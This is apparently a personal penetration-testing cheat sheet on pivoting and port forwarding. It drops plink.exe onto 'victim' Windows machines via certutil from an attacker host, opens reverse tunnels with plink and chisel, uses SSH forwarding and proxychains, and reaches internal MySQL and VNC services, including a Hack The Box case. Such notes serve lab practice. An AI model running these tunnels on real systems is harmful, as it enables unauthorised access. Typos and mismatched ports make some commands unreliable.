- [Windows](#Windows)
- [Linux](#Linux)

# Windows

- edit /etc/ssh/sshd_config
```
uncomment PermitRootLogin and set as yes
```

#### Plink
- Download Plink.exe file

- Put plink on victim windows machine
```
certutil -urlcache -f http://[your_ip]/plink.exe plink.exe
```

- run plink on on windows machine 
plink.exe -l root -pw <pass> -R 445:127.0.0.1:445 <your_linux_ip>
  
  
#### chisel
- Download chisel
https://github.com/jpillora/chisel/releases/tag/v1.7.4


- Run chisel server on your linuxmachine: 
```
./chisel server -p 9999 --reverse -v
```

- Run chisel client on victim windows machine:
```
chisel.exe client <your_linux_ip>:9000 R:widnows_service_port:127.0.0.1:widnows_service_port

e.g:
chisel.exe client 10.10.14.49:9999 R:8888:127.0.0.1:8888
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Linux

#### SSH port forwarding
In case exploit can not be run locally on target machine, you can frowarded the port via SSH to your local machine
```
ssh [username]@[victim_ip] -L [your_local_port]:127.0.0.1:[victim_service_port] 

ssh [username]@[victim_ip] -R [your_local_port]:127.0.0.1:[victim_service_port] 
```


# TODO!!!

### Proxychains 
#### use squid proxy
- nano /etc/proxychains.conf
#### add:
- http 192.168.213.141 3128

#### scan ports via tunnel
- proxychain nmap -sT -p 22 127.0.0.1

#### ssh login via proxychains
- proxychains ssh name@127.0.0.1

#### use squid proxy
- proxytunnel -p 192.168.0.115:3128 -d 127.0.0.1:22 -a 1234
#### e.g:
- ssh name@127.0.0.1 -p 1234

Exploit code can be run on local machine

#### case study
##### on victim machine
- check service port *netstat -nl*
- ssh -R 4444:127.0.0.1:3306 root@192.168.100.104

##### on yours kali machine
mysql -u root -h 127.0.0.1 -P 4444

#### case study 2 (TightVNC)
```
- check ps -aux
  result: Xvnc :1 -desktop X -httpd /usr/../tightvnc/classes
- check netstat -an
  result: 127.0.0.1.5901
- port forwarding from local machine
  ssh -L 5901:127.0.0.1:5901 username@10.10.10.84
  pass password
- vncviewer 127.0.0.1:5901 -passwd secret_file_with_password
```

#### case study 3 (htb poison vnc)
```
on your machine:
ssh -L 5902:localhost:5901 charix@10.10.10.84
in second window:
vncviewer -passwd secret 127.0.0.1:5902
```

### Port forwarding via ncat
- ncat -u -l  [port1] -c  'ncat -u -l [port2]'
  - Now all the connections for port [port1] will be forwarded to port [port2]
  
  
